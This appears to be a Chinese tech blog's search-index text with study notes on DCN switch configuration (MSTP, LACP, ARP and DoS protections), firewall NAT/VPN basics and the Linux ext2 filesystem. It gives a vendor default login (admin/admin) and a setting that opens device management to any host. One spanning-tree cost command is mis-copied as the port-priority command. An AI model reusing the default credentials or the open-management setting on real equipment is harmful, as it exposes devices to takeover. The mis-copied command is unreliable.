123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475S1#show spanning-tree *********************************** Process 0 *********************************** -- MSTP Bridge Config Info --Standard : IEEE 802.1sBridge MAC : 00:03:0f:91:05:2fBridge Times : Max Age 20, Hello Time 2, Forward Delay 15Force Version: 3########################### Instance 0 ###########################Self Bridge Id : 28672.00:03:0f:91:05:2fRoot Id : this switchExt.RootPathCost : 0Region Root Id : this switchInt.RootPathCost : 0Root Port ID : 0Current port list in Instance 0: Ethernet1/0/1 Ethernet1/0/2 Ethernet1/0/3 (Total 3) PortName ID ExtRPC IntRPC State Role DsgBridge DsgPort-------------- ------------ --------- --------- --- ---- ------------------ ------------ Ethernet1/0/1 128.00001 0 0 FWD DSGN 28672.00030f91052f 128.00001 Ethernet1/0/2 128.00002 0 0 FWD DSGN 28672.00030f91052f 128.00002 Ethernet1/0/3 128.00003 0 0 FWD DSGN 28672.00030f91052f 128.00003 S2#show spanning-tree *********************************** Process 0 *********************************** -- MSTP Bridge Config Info --Standard : IEEE 802.1sBridge MAC : 00:03:0f:91:05:b0Bridge Times : Max Age 20, Hello Time 2, Forward Delay 15Force Version: 3########################### Instance 0 ###########################Self Bridge Id : 32768.00:03:0f:91:05:b0Root Id : 28672.00:03:0f:91:05:2fExt.RootPathCost : 0Region Root Id : 28672.00:03:0f:91:05:2fInt.RootPathCost : 20000Root Port ID : 128.3Current port list in Instance 0: Ethernet1/0/3 Ethernet1/0/4 (Total 2) PortName ID ExtRPC IntRPC State Role DsgBridge DsgPort-------------- ------------ --------- --------- --- ---- ------------------ ------------ Ethernet1/0/3 128.00003 0 0 FWD ROOT 28672.00030f91052f 128.00003 Ethernet1/0/4 128.00004 0 20000 BLK ALTR 32768.00030f90ce0d 128.00004 S3#show spanning-tree *********************************** Process 0 *********************************** -- MSTP Bridge Config Info --Standard : IEEE 802.1sBridge MAC : 00:03:0f:90:ce:0dBridge Times : Max Age 20, Hello Time 2, Forward Delay 15Force Version: 3########################### Instance 0 ###########################Self Bridge Id : 32768.00:03:0f:90:ce:0dRoot Id : 28672.00:03:0f:91:05:2fExt.RootPathCost : 0Region Root Id : 28672.00:03:0f:91:05:2fInt.RootPathCost : 20000Root Port ID : 128.2Current port list in Instance 0: Ethernet1/0/2 Ethernet1/0/4 (Total 2) PortName ID ExtRPC IntRPC State Role DsgBridge DsgPort-------------- -------- --------- --------- --- ---- ------------------ -------- Ethernet1/0/2 128.002 0 0 FWD ROOT 28672.00030f91052f 128.002 Ethernet1/0/4 128.004 0 20000 FWD DSGN 32768.00030f90ce0d 128.004 Current port list in Instance 0:默认所有vlan都映射到intance 0 intRPC: 内部开销 extRPC: 外部开销 Region Root Id: 域根 Root Port ID: 128.3: 根端口(port_pri.vlan_id) DsgBridge: 指定桥, 上游交换机给我发的BPDU的桥ID(bridge_pri.mac) Designate Port: 上游交换机给我发BPDU的端口 选举根桥接收BPDU, 比较BID–&gt;先比较优先级，优先级值越小，优先级越高。如果优先级相同，则比较MAC地址大小，越小越优 123456# 更改优先级S3(config)#spanning-tree priority ? &lt;0-61440&gt; Priority value &lt;0-61440&gt;# 更改在实例里的优先级spanning-tree mst &lt;instance-id&gt; priority &lt;bridge-priority&gt; 根桥选出后，其他交换机都可以叫指定桥。指定桥不再主动发出BPDU，只会转发根桥的BPDU。根桥每间隔Hello Time（默认2秒）时间周期性发出BPDU。 根端口 PID共占2个字节，其中，优先级与端口索引号各占1字节。但为了避免端口索引号不够用，把优先级中的低4位保留用于端口索引号，一般取值为0000。高4位优先级默认二进制取值为1000，所以端口优先级默认为128, 低4位无意义, step为16 对比哪个离根桥最近, 也就是对比RPC(root path cost) 如果RPC相同, 还有几个参数提供选择: 指定BID&gt;指定Port ID&gt;自身端口PID(优先级&gt;端口编号) 123# 端口下# 更改优先级spanning-tree mst &lt;instance-id&gt; port-priority &lt;port-priority&gt; 指定端口cost小的就是指定端口 123# 端口模式下# 更改costspanning-tree mst &lt;instance-id&gt; port-priority &lt;port-priority&gt; 配置MSTP域12345678910111213# config# 进入MSTP域配置模式spanning-tree mst configuration# 域名name &lt;name&gt;# 创建实例+配置vlan与实例的映射关系instance &lt;instance-id&gt; vlan &lt;vlan-list&gt;# 修订级别revision-level &lt;level&gt;# 退出不保存abort# 退出保存exit PORTFAST123# 端口模式下# postfast与bpduguradspanning-tree portfast [bpdufilter | bpduguard] [recovery &lt;30-3600&gt;] 参考 mstp 这篇MSTP是真的爱了！(图解易懂) 网络工程师（21）：STP怎么选根桥和根端口(图解易懂)","link":"/Internet-equipment/DCN/CS6200-28X-EI/MSTP.html"},{"title":"小知识","text":"VLSM CIDR picocom VLSM&amp;CIDR如果说vlsm是将子网掩码细分, 那CIDR就是将子网掩码汇总 用来规划网络 串口工具sudo pacman -S picocom 使用sudo picocom -b 波特率 device ctrl-a 进入转义模式 ctrl-h 帮助","link":"/Internet-equipment/DCN/CS6200-28X-EI/Other.html"},{"title":"Port_channel","text":"Port Channel是一组物理端口的集合体，在逻辑上被当作一个物理端口。对用户来讲，完全可以将这个Port Channel当作一个端口使用，因此不仅能增加网络的带宽，还能提供链路的备份功能。 交换机提供了两种配置端口汇聚的方法：手工生成Port Channel、LACP（Link Aggregation Control Protocol）动态生成Port Channel。只有双工模式为全双工模式的端口才能进行端口汇聚。 一些命令不能在port-channel上的端口使用，包括：arp，bandwidth，ip，ip-forward等 同一组Port channel为使Port Channel正常工作，本交换机Port Channel的成员端口必须具备以下相同的属性： 端口均为全双工模式 端口速率相同 端口同为Access端口并且属于同一个VLAN或同为Trunk端口或同为hybrid端口 如果端口同为Trunk端口或同为hybrid端口，则其Allowed VLAN和Native VLAN属性也应该相同 选举出Port Channel中端口号最小的端口作为Port Channel的主端口（Master Port） 若打开Spanning-tree功能，Spanning-tree视Port Channel为一个逻辑端口，由主端口发送BPDU帧 最大组数为128个，组内最多的端口数为8个 LACP汇聚端口状态 如果当前的成员端口数量超过了最大端口数的限制, 本端系统和对端系统会进行协商决定端口的状态 selected: 收发LACP报文, 转发用户数据 standby: 收发LACP报文, 不转发用户数据 优先比较以下值, 小的为selected: 系统优先级&gt;系统MAC地址&gt;端口优先级&gt;端口号 在一个汇聚组中, 处于selected状态且端口号最小的端口为汇聚组的主端口, 其他处于selected状态的端口为汇聚组的成员端口 配置123456789101112131415161718192021222324252627282930313233343536373839404142# config# 创建port groupport-group &lt;port-group-number&gt;# 设置LACP协议的系统优先级lacp system-priority &lt;system-priority&gt;# 端口模式# 将该端口加入port group并设置模式, on表示静态# active与passive相对 (一台交换机active, 一台passive)port-group &lt;port-group-number&gt; mode {active | passive | on}# 设置端口优先级lacp port-priority &lt;port-priority&gt;# 进入port-channel配置模式interface port-channel &lt;port-channel-number&gt; bpdu-tunnel-protocol Bpdu隧道 description 设置别名 dot1q-tunnel Dot1q隧道 end 结束当前模式并转换到EXEC模式 erps-ring 运行G.8032协议的以太网环 ethernet 以太网 exit 结束当前模式并返回上一次模式 fulleaps 升级的以太网自动保护倒换协议 gvrp 打开GVRP help 交互系统描述 igmp 因特网组管理协议 interface 选择要配置的接口 ip IP协议配置命令 ipv6 IPv6信息 language 设置语言 mac-notification MAC地址信息公告报文发送 mrpp 多环路自动保护协议 no 取消某命令或配置交换机缺省值 pppoe 添加链路标识功能 shutdown 关闭所选端口 spanning-tree 生成树配置 switchport 设置交换机端口特性 ulpp 上行链路保护功能 ulsm 上行链路状态监控 vlan VLAN命令 vlan-tag 配置 vlan-tag状态 vlan-translation VLAN转换 动态与静态的区别 动态: 加入group时不会拆散原来的group","link":"/Internet-equipment/DCN/CS6200-28X-EI/Port-channel.html"},{"title":"Security","text":"交换机端口安全和ARP, ACL, URPF, DOS等配置 ACL 建议使用命名ACL 神州交换机的ACL设置语句语法与CISCO ACL.md 的基本一样, 使用有以下区别 1234567891011121314151617181920212223# 如果要启用ACL, 必须使用以下指令Sw(config)#firewall enable # 可以将ACL应用于Telnet/ssh/web, test是我配置的命名ACLSw(config)#authentication ip access-class test in telnet # access-group可以显示一条access-list与特定端口的绑定关系Sw(config)#show access-group interface ethernet 1/0/1interface name:Ethernet1/0/1 IP Ingress access-list used is test, traffic-statistics Disable.Sw(config)#show access-lists ip access-list standard test(used 1 time(s)) 2 rule(s) rule ID 1: deny 192.168.1.0 0.0.0.255 rule ID 3: deny 10.1.128.0 0.0.0.255 S3(config)#access-list ? &lt;1-99&gt; IP 标准访问列表 &lt;1-99&gt; &lt;100-199&gt; 扩展访问列表规则 &lt;100-199&gt; &lt;1100-1199&gt; MAC扩展访问列表规则 &lt;1100-1199&gt; &lt;200-299&gt; 扩展访问列表规则(支持非连续IP地址掩码) &lt;200-299&gt; &lt;3100-3199&gt; MAC-IP扩展访问列表规则 &lt;3100-3199&gt; &lt;3200-3299&gt; MAC-IP扩展访问列表规则(支持非连续IP地址掩码) &lt;3200-3299&gt; &lt;5000-5099&gt; 组播源控制访问列表规则 &lt;5000-5099&gt; &lt;6000-7999&gt; 组播目的控制访问列表规则 &lt;6000-7999&gt; &lt;700-799&gt; MAC标准访问列表规则 &lt;700-799&gt; 端口绑定MAC 绑定后如果连接的不是绑定的MAC, 或者数量超出限制, 都会触发交换机的保护机制 可以有效的防止MAC泛洪 123456789101112131415Sw(config)#interface ethernet 1/0/1Sw(config-if-ethernet1/0/1)#switchport port-security# 静态绑定Sw(config-if-ethernet1/0/1)#switchport port-security 00:90:9e:9a:a0:60# 可设置MAC数量switchport port-security max &lt;cnt&gt;# 动态学习Sw(config)#mac-address-learning cpu-control Sw(config)#show port-security address Secure Mac Address Table ------------------------------------------------------------------------------------- Vlan Mac Address Type Ports 1 00-90-9e-9a-a0-60 SECURED Ethernet1/0/1 Total Addresses:1 端口模式下 作用 `switchport port-security violation {protect recovery `clear port-security {all configured 端口的IP和MAC-IP绑定[AM]AM(Access Management)可以配置只转发某IP或者MAC-IP 12345678910111213Sw(config)#am enable Sw(config)#interface ethernet 1/0/1 # 端口启用AM, 默认禁止所有的IP报文与ARP报文转发Sw(config-if-ethernet1/0/1)#am port # ip, 最后一个参数可以理解为192.168.1.1-10, 是一个范围值Sw(config-if-ethernet1/0/1)#am ip-pool 192.168.1.1 10# MAC-IPSw(config-if-ethernet1/0/1)#am mac-ip-pool 00:90:9e:9a:a0:60 10.1.128.24Sw(config)# show am interface ethernet 1/0/1AM is enabledInterface Ethernet1/0/1 am port am mac-ip-pool 00-90-9e-9a-a0-60 10.1.128.24 URPF[三层] 通常情况下，网络中的路由器接收到报文后，获取报文的目的地址，针对目的地址查找路由，如果查找到则进行正常的转发，否则丢弃该报文。由此得知，路由器转发报文时，并不关心数据包的源地址，这就给源地址欺骗攻击有了可乘之机。 源地址欺骗攻击就是入侵者通过构造一系列带有伪造源地址的报文，频繁访问目的地址所在设备或者主机，即使受害主机或网络的回应报文不能返回到入侵者，也会对被攻击对象造成一定程度的破坏。 URPF(Unicast Reverse Path Forwarding)通过检查数据包中源IP地址，并根据接收到数据包的接口和路由表中是否存在源地址路由信息条目，来确定流量是否真实有效，并选择数据包是转发或丢弃。 全局配置模式 作用 urpf enable 全局启动URPF 端口配置模式 作用 `ip urpf enable {loose strict}` strict: 不但要求路由器转发表中，存在去往报文源地址的路由；而且还要求报文的入接口与转发表中去往源地址路由的出接口一致 loose: 仅要求路由器的转发表中，存在去往报文的源地址路由即可 ARP 全局 作用 arp timeout arp表项老化时间(s) vlan接口下 作用 arp &lt;ip_address&gt; &lt;mac_address&gt; {interface [ethernet] &lt;portName&gt; } 指定静态arp 静态arp只能在vlan下且参数必须有物理接口才能添加成功 防ARP扫描攻击 ARP攻击会在局域网内大量的广播ARP报文, 消耗网络带宽 ARP也能也能进行其他攻击, 比如中间人攻击-ARP毒化 这些攻击极度的威胁着网络的安全 防止ARP扫描攻击有两种方式 基于端口 如果某个端口的ARP报文超过一定阈值, 则down该端口 基于IP 记录某个IP的报文, 可以设置限速和隔离两个阈值, 超过隔离阈值则禁止来自此IP的任何流量 两者可同时存在 基于端口和基于IP的配置 开启ARP扫描功能 1anti-arpscan enable [ip|port] 设置基于端口阈值(包/s) 1anti-arpscan port-based threshold &lt;threshold-value&gt; 基于IP的阈值配置, 二级阈值必须&gt;一级阈值 1anti-arpscan ip-based level1|level2 threshold &lt;threshold-value&gt; 注意: CS6200-28X-EI SoftWare Package Version 7.5.3.2(R0004.0030)不支持一二级阈值, 超过设置阈值则禁止来自此IP的任何流量 其他配置 全局 作用 anti-arpscan trust ip &lt;ip-address&gt; [&lt;netmask&gt;] 配置信任IP anti-arpscan recovery enable 启用自动恢复功能 anti-arpscan recovery time &lt;seconds&gt; 恢复秒数 anti-arpscan log enable 打开日志 配置信任端口 12# 端口模式下anti-arpscan trust &lt;port | supertrust-port| iptrust-port &gt; ARP绑定 在IPv4里, 为了防止ARP中间人攻击, ARP绑定也是一种防御手段 IPv6使用的是ND协议, 这是一个类ARP的协议, ND绑定命令同ARP ARP绑定有两种方法 关闭交换机ARP更新即交换机的MAC-PORT表存在后就不允许再改变 指令[全局配置]: ip arp-security updateprotect 关闭自动学习功能只能设置静态ARP, 如果先前有动态也可以手动转化为静态 指令[全局配置]: ip arp-security learnprotect 动态转为静态[全局配置]: ip arp-security convert ARP guard 对于ARP中间人攻击, arp guard则采用了保护ip的方法, 如果arp报文的源IP与保护IP一致则丢弃该报文, 通常用来保护网关, 不应该用来保护大量的IP地址, 会影响性能 指令[全局]: arp-guard ip &lt;addr&gt; 端口&amp;vlan的MAC和IP数量限制交换机默认对MAC和IP表项的数量都没有限制, 直到将硬件填满为止. 这样在遭受DOS攻击时(如ARP, MAC欺骗), 很容易将表项填满, 进行数量限制可以预防DOS攻击 对于动态学习的现存表项, 都满足大于限制数量则停止学习, 小于则可以继续学习的原则 端口限制 端口模式 作用 switchport mac-address dynamic maximum &lt;value&gt; 启用限制MAC功能 `switchport &lt;arp nd&gt; dynamic maximum ` `switchport mac-address violation {protect shutdown} [recovery &lt;5-3600&gt;]` VLAN限制 vlan vlan_id模式 作用 vlan mac-address dynamic maximum &lt;value&gt; 开启限制MAC功能 vlan接口模式 作用 `ip[v6] &lt;arp nd&gt; dynamic maximum ` Gratuitous(免费) ARP也是一种可以防止ARP欺骗的方法, 交换机主动通过向局域网广播ARP报文 减少ARP请求次数 防止ARP欺骗网关 配置指令[全局/接口]: ip gratuitous-arp &lt;5-1200s&gt; SSL123456# 启用服务Switch(config)#ip http secure-server# 绑定端口Switch(config)#ip http secure-port 1025# 加密套件Switch(config)#ip http secure-ciphersuite rc4-128-sha 防DOS攻击 DoS 是 Denial of Service 的缩写,意为拒绝服务。DoS 攻击是网络上一种简单但很有效的破坏性攻击手段,服务器会由于不停顿地处理攻击者的数据包,从而正常用户发送的数据包会被丢弃,得不到处理,从而造成了服务器的拒绝服务,更严重的会导致服务器敏感数据泄漏。 IP SpoofingIP欺骗简述: hacker发送修改过源IP数据包给服务器, 服务器错误的将数据回复给修改过的IP客户端, 利用该原理可义进行DOS和DDOS攻击, 并且有一定隐匿性 解决方案: 在网络边缘设备检查源IP与其来源是否匹配 指令[全局]: dosattack-check srcip-equal-dstip TCP非法标志攻击简述: hacker利用TCP报文的6个标志位进行攻击, 如SYN泛洪, ACK和FIN/RST泛洪等 指令[全局]: dosattack-check tcp-flags enable ICMP碎片攻击简述: IP支持2^16字节, MTU一般都是1500字节, hacker发送&gt;2^16字节的数据包, 导致系统出错 指令[全局] icmp不可分片: dosattack-check icmp-attacking 设置icmp数据包长度: dosattack-check icmpV4-size 100 VLAN hopping原理简述: 交换机开启了DTP(动态中继协议)后, hacker如果和交换机间建立了一条中继链路, 然后就能获取该交换机所有VLAN中的信息. 解决方法: 关闭DTP, 手动中继 参考 什么是 IP 欺骗？ 网络层-TCP-UDP-攻击与防御原理","link":"/Internet-equipment/DCN/CS6200-28X-EI/Security.html"},{"title":"dynamic-vlan","text":"动态VLAN可以根据用户的MAC, IP, 网络层协议进行划分 静态VLAN是基于端口进行划分 注意: 动态 VLAN 需要跟端口的 Hybrid 属性配合才能很好的工作 hybrid&amp;trunk区别: Hybrid 端口可以允许多个 VLAN 的报文发送时不打标签,而 Trunk 端口只允许 native VLAN 的报文发送时不打标签 基于MAC 打开端口的基于MAC功能, hybrid 123SwitchA(Config-Ethernet1/0/1)#switchport mac-vlan enableSwitchA(Config-Ethernet1/0/1)#swportport mode hybridSwitchA(Config-Ethernet1/0/1)#swportport hybrid allowed vlan vlan_id &lt;untag|tag&gt; 指定VLAN为基于MAC模式 1mac-vlan vlan &lt;vlan-id&gt; 指定vlan与MAC的对应关系 1mac-vlan mac &lt;mac-addrss&gt; &lt;mac-mask&gt; vlan &lt;vlan-id&gt; priority &lt;priority-id&gt; mac-mask建议为ff:ff:ff:ff:ff:ff 基于IP 打开端口的基于IP功能, hybrid 123SwitchA(Config-Ethernet1/0/1)#switchport subnet-vlan enableSwitchA(Config-Ethernet1/0/1)#swportport mode hybridSwitchA(Config-Ethernet1/0/1)#swportport hybrid allowed vlan vlan_id &lt;untag|tag&gt; 动态的vlan一定要在端口模式下进行hybrid allowed 设置IP子网与 VLAN 的对应关系 1subnet-vlan ip-address &lt;ipv4-addrss&gt; mask &lt;subnet-mask&gt; vlan &lt;vlan-id&gt; priority &lt;priority-id&gt; 调整优先级12dynamic-vlan mac-vlan preferdynamic-vlan subnet-vlan prefer","link":"/Internet-equipment/DCN/CS6200-28X-EI/dynamic-vlan.html"},{"title":"NAT简述及其配置","text":"网络地址转换(Network Address Translation)简称为 NAT,是将 IP 数据包包头中的 IP地址转换为另一个 IP 地址的协议。当 IP 数据包通过路由器或者安全网关时,路由器或者安全网关会把 IP 数据包的源 IP 地址和/或者目的 IP 地址进行转换。 简述NAT可以修改IP地址和TCP端口, 因为IP分为来源IP和目标IP, 所有NAT又分为SNAT和DNAT SNAT: 最常见的方式, 可以让LAN内的主机连接到internet DNAT: 修改目标IP可以让公网IP访问到LAN的服务器(DMZ) 配置 注意: 配置NAT时可以先配置地址簿(存储IP地址条目)和服务簿(协议,端口条目)","link":"/Internet-equipment/DCN/DCFW-1800E-N3002/NAT.html"},{"title":"VPN简述及实现","text":"VPN(Virtual Private Network虚拟专用网络) vpn通常拿来做2个事情，一个是可以让世界上任意2台机器进入一个虚拟的局域网中（当然这个局域网的数据通讯是加密的，很安全，用起来和一个家庭局域网没有区别），一个是可以用来翻墙 神州数码系统支持 VPN 功能,包括 IPSec VPN、基于 SSL 的远程登录解决方案——Secure Connect VPN(简称为 SCVPN) 、拨号 VPN、PnPVPN 和 L2TP VPN。用户可以配置 VPN隧道,并且根据不同需求选择以下两种 VPN 隧道的应用方式:♦ 基于策略的 VPN: 将配置成功的 VPN 隧道名称引用到策略规则中,使符合条件的流量通过指定的 VPN 隧道进行传输。♦ 基于路由的 VPN: 将配置成功的 VPN 隧道与隧道接口绑定;配置静态路由时,将隧道接口指定为下一跳路由。符合条件的流量将会经过 VPN 隧道进行传输。 Secure Connect VPN 参考 vpn工作原理和搭建方法 VPN原理与简单应用 IPSec-VPN基本原理 IPSec-VPN之IKE协议详解","link":"/Internet-equipment/DCN/DCFW-1800E-N3002/VPN.html"},{"title":"防火墙基础概念及配置","text":"介绍了基础的系统架构, 全局使用UI进行配置 webUI基于Version 5.0和5.5 接口接口允许流量进出安全域。因此,为使流量能够流入和流出某个安全域,必须将接口绑定到该安全域,并且,如果是三层安全域,还需要为接口配置 IP 地址。然后,必须配置相应的策略规则,允许流量在不同安全域中的接口之间传输。多个接口可以被绑定到一个安全域,但是一个接口不能被绑定到多个安全域。系统支持多种类型接口,实现不同功能。 虚拟接口也算一个接口 安全域(ZONE)安全域将网络划分为不同部分,例如 trust(通常为内网等可信任部分)、untrust(通常为因特网等存在安全威胁的不可信任部分)等。将配置的策略规则应用到安全域上后,安全网关就能够对出入安全域的流量进行管理和控制。系统提供 8 个预定义安全域, 分别是: trust、 untrust、 dmz、L2-trust、L2-untrust、L2-dmz、VPNHub 和 HA。 一个安全域只能绑定一个VS或VR 为接口设置安全域 VSwitch(Virtual Switch)VSwitch 工作在二层, 将二层安全域绑定到 VSwitch 上后, 绑定到安全域的接口也被绑定到该 VSwitch 上。系统有一个默认的VSwitch, 名为 VSwitch1, 默认情况下, 二层安全域都会被绑定到 VSwtich1 中。 为安全域设置VSwitch VR(Virtual Route)VRouter 具有路由器功能,不同 VR 拥有各自独立的路由表。系统中有一个默认 VR, 名为 trust-vr, 默认情况下, 所有三层安全域都将会自动绑定到 trust-vr 上 策略策略实现安全网关保证网络安全的功能。通过策略规则决定从一个安全域到另一个安全域的哪些流量该被允许,哪些流量该被拒绝。 webUI配置 安全网关的 ethernet0/0 接口配有默认 IP 地址 192.168.1.1/24,并且该接口的各种管理功能均为开启状态 使用 https://192.168.1.1 默认用户: admin 密码: admin 连接安全123DCFW-1800# configure # 允许来自0.0.0.0/0的登录类型, 0.0.0.0代表任意主机DCFW-1800(config)# admin host 0.0.0.0/0 &lt;any|http|https|ssh|telnet&gt; webUI界面 5.0路径: 系统管理&gt;设备管理 接口服务123456789101112DCFW-1800(config)# interface ethernet0/0DCFW-1800(config-if-eth0/0)# manDCFW-1800(config-if-eth0/0)# manage ? ip Interface Internet Protocol config commands ssh Enable service SSH telnet Enable service telnet ping Enable service ping snmp Enable service SNMP http Enable service Web https Enable service SSL ftp Enable service ftp traceroute Enable service udp-tcp traceroute 管理员 5.0路径: 系统管理&gt;设备管理","link":"/Internet-equipment/DCN/DCFW-1800E-N3002/firewall.html"},{"title":"（五）Linux文件系统管理","text":"深入理解3 文件系统特性 每个操作系统设置的文件属性、权限都不同，将分区格式化才能成为系统能够利用的文件格式（filesystem） 传统一个分区只能格式化成一个文件系统，新技术能将一个分区格式化成多个文件系统（LVM） 格式化不再针对硬盘分区 一个被挂载的数据为一个文件系统而不是一个分区 Linux有文件权限、属性，文件系统会将两部分数据存放在不同的区块，权限属性放在inode，实际数据放在数据块中，还有一个超级区块（superblock）记录文件系统的整体信息，比如数据快总量、剩余、使用 每个inode和区块都有编号，它们的作用如下 超级区块：记录文件系统的整体信息，包括inode和超级区块的总量、使用、剩余，以及文件系统的格式和信息等 inode：记录文件属性，一个属性占用一个inode，同时记录文件数据所在的区块号码 数据区块：实际记录文件的内容，文件过大占用多个区块 硬盘的读取顺序是inode记录的号码，比如记录的是1、3、5、6号码，则硬盘会一次性读取这四个块的内容，这叫索引式文件系统 u盘的FAT格式则是1-&gt;3-&gt;5-&gt;6这样的读取顺序 碎片整理：当存取的文件过于离散（读取性能差）时使用碎片整理可以将文件的区块集中起来 Linux的ext2文件系统ext2(Linux second extended filesystem,ext2fs) ext2采用了inode，文件系统一开始就将inode和数据块规划好了了，除非重新格式化或者使用resize2fs命令修改大小，但将inode和数据块放在一起不好管理，所以一般都是区分为多个区块群组 文件系统最前面有一个boot sector，可以用来装引导程序（多重引导） 每个群组有六个主要内容 数据区块在ext2文件系统中支持的区块大小有1k、2k和4k，大小在格式化时确定，每个区块大小所支持的单一文件大小和文件系统的最大支持磁盘容量都不相同 Block大小 1KB 2KB 4KB 单一文件限制 16GB 256GB 2TB 最大文件系统总容量 2TB 8TB 16TB 就算文件系统支持2TB，软件也要支持才行 ext2文件系统的区块限制 原则上，区块的大小与数量在格式化完就不能再修改（重新格式化） 每个区块内最多只能放一个文件的数据 如果文件大于一个区块，则一个文件会占用多个区块 若文件小于一个区块，则剩余容量被浪费 比如文件系统使用4k大小，而每个文件只有1k，则存储一个文件会浪费3k 当文件过大时，使用区块容量最大的则文件系统的区块号码就少，方便读写 inode table 记录了读写属性 拥有者和群组 大小 文件的atimr、ctime、mtime 特性标识flag，如SetUID 该文件的真正内容指向（pointer） 每个inode的大小为128B（ext4、xfs可以到256B） 每个文件仅占用一个inode 所以系统能建立的文件数量与inode数量有关 系统读取文件时会先找到inode，分析inode记录的权限与用户的权限是否符合，然后才能读取 为了记录更多的信息，inode记录的区块号码的区域定义是12个直接、1个间接、1个双间接、1个三间接 图源https://zhuanlan.zhihu.com/p/40604943 文件太大是，才会用到间接，间接就是再拿一个区块来记录区块号码的记录区 以1k区块为例 12个直接：12X1K=12K 每个区块1K，记录一个区块使用4B，一个区块能记录256个区块 间接：256X1K=256K 双间接：256X256X1K=256^2K 三间接：256^3K 以上加起来16GB 由于大于2K的区块会受到ext2文件系统的限制，上面的计算不适用2K、4K Superblock 记录数据区块与inode的总量 未使用的、已使用的inode与数据块数量 数据块的大小（1、2、4k），inode的大小（128、256B） 文件系统的挂载信息，最近一次写入数据的时间、最近一次检验磁盘（fsck）的时间等文件系统相关信息 一个有效位数值，若此文件已被挂载，则有效位为0，否则为1 虽然每个群组都可能含有超级区块，但实际上文件系统应仅有一个超级区块，除了第一个区块有超级区块外，后面不一定有超级区块，有的话主要也是作为备份 Filesystem Description可以描述每个区块群组的开始和结束区块，以及说明每个区段（suoerblock、对照表、inode对照表、数据区块）分别位于哪一个区块之间，可以使用dumpe2fs观察 区块对照表（block bitmap）说明哪些区块是是空的，哪些使用过的 inode对照表负责记录使用与未使用的inode号码 dumpe2fs可以用查询ext系列超级区块的信息 结合目录树目录目录主要记录文件名，文件才是真正记录文件的地方 创建目录时，文件系统会分配一个inode和至少一个区块给目录 inode记录权限和属性 区块记录文件名和文件名的inode信息 目录的文件名过多时，会使用多个区块 文件 建立文件时，会分配一个inode和相对于文件大小的区块数量，注意直接不够用时用间接会使用额外的区块 读取目录树目录树从根目录开始，系统通过挂载点的信息找到挂载点的inode，层层递进找到正确的目录 例如/etc/passwd 通过挂载点找到/的inode，判断权限rx才能进入 承上找到/的区块，在区块里找到etc/的inode号码，同样判断rx权限 承上找到etc/的区块，找到passwd文件的inode号码，判断r 读取passwd的区块内的内容 文件大小和读取性能文件通常是无法写在一起的，一般是填充在空的区块中，就会发生文件数据离散 当文件太过离散时，就会发生读取效率降低 可以把文件系统的数据复制出来，格式化文件系统在复制回去解决 但是文件系统太大时，文件太容易分散，磁盘的物理结构查找比较费时，要合理规划文件系统大小 ext文件的存取和日志式文件系统的功能创建文件时文件系统的操作是 判断用户在此目录是否具有wx权限 在inode对照表找到空的inode号码，写入权限属性 根据区块对照表找到空的区块号码，写入数据，并更新inode所指向的区块数据 更新inode对照表与区块对照表，然后更新超级区块 一般将inode对照表、数据区块叫数据存放区，超级区块、区块对照表、inode对照表较元数据（metadata），因为数据变动时都可能会影响这些数据 数据的不一致（inconsistent）正确的文件写入步骤如上，但总会碰到一些特殊情况，比如断电、死机、系统错误等，可能会导致元数据没有更新，然后元数据和实际数据就会不一致 在ext2为了解决这个问题，借由超级区块当中记录的有效位（是否挂载）和文件系统的状态（是否正确卸载）来判断是否强制检查数据的一致性，或者手动使用e2fsck程序检查，但是这种检查都会检查整个文件系统，相当费时，于是有了后来的日志式文件系统 日志式文件系统（journaling filesystem）所谓日志就是使用一个区块专门记录文件的写入和修改文件的操作 当系统写入文件时，会在日志记录区记录写入的信息 然后开始正常写入，更新metadata 结束后才会完成此次记录 出问题时就会专门检查这个记录区块，这样就达到了快速修复文件系统，是日志文件系统最基础的功能 Linux文件系统的运行若编辑一个大型文件，从磁盘读取到内存，再给CPU，编辑中如果再写入磁盘，由于磁盘速度比CPU慢很多，编辑中会频繁的等待，没有效率，于是Linux采用了异步处理（asynchronously）的方式，大致过程如下 内存加载文件，若没被修改，则被系统设置为干净（clean） 修改过则是dirty 系统会不定时的将dirty写进磁盘，或者手动使用sync 也就是将文件放在内存中以提高系统性能，所以Linux文件系统与内存关系很大 系统会将常用的文件加载到内存缓存区 所以Linux的物理内存都会用光，可以提高系统性能 可以手动使用sync将数据写入磁盘 正常关机也会调用sync指令 若不正常关机，因为数据没写进磁盘，重新启动会花更多时间进行磁盘校验，甚至会导致文件系统损坏 挂载点的意义(mount point)每个文件系统都有inode、区块，要与目录树链接才能使用，这就是挂载 1234[manu@study ~]$ ls -lid / /boot /home64 dr-xr-xr-x. 17 root root 245 1月 2 22:29 /64 dr-xr-xr-x. 5 root root 4096 12月 28 07:44 /boot64 drwxr-xr-x. 3 root root 20 12月 28 07:43 /home 装Linux时我安装了/ 、/boot 、/home三个目录，于是有3个挂载点 每个的inode相同，代表三个不同的文件系统 Linux支持的文件系统 传统文件系统：ext2、minix、FAT、iso9660等 日志式文件系统：ext3、ext4、ReiserFS、Windows’NTFS、IBM’s JFS、SGI’s XFS、ZFS 网络文件系统：NFS、SMBFS 查看某Linux支持的文件系统 12345678910111213141516171819202122232425262728[manu@study ~]$ ls -l /lib/modules/$(uname -r)/kernel/fs总用量 20-rw-r--r--. 1 root root 5980 8月 8 02:21 binfmt_misc.ko.xzdrwxr-xr-x. 2 root root 25 12月 28 07:32 btrfsdrwxr-xr-x. 2 root root 30 12月 28 07:32 cachefilesdrwxr-xr-x. 2 root root 24 12月 28 07:32 cephdrwxr-xr-x. 2 root root 24 12月 28 07:32 cifsdrwxr-xr-x. 2 root root 26 12月 28 07:32 cramfsdrwxr-xr-x. 2 root root 23 12月 28 07:32 dlmdrwxr-xr-x. 2 root root 26 12月 28 07:32 exofsdrwxr-xr-x. 2 root root 24 12月 28 07:32 ext4drwxr-xr-x. 2 root root 60 12月 28 07:32 fatdrwxr-xr-x. 2 root root 27 12月 28 07:32 fscachedrwxr-xr-x. 2 root root 42 12月 28 07:32 fusedrwxr-xr-x. 2 root root 24 12月 28 07:32 gfs2drwxr-xr-x. 2 root root 25 12月 28 07:32 isofsdrwxr-xr-x. 2 root root 24 12月 28 07:32 jbd2drwxr-xr-x. 2 root root 25 12月 28 07:32 lockd-rw-r--r--. 1 root root 5216 8月 8 02:21 mbcache.ko.xzdrwxr-xr-x. 6 root root 137 12月 28 07:32 nfsdrwxr-xr-x. 2 root root 46 12月 28 07:32 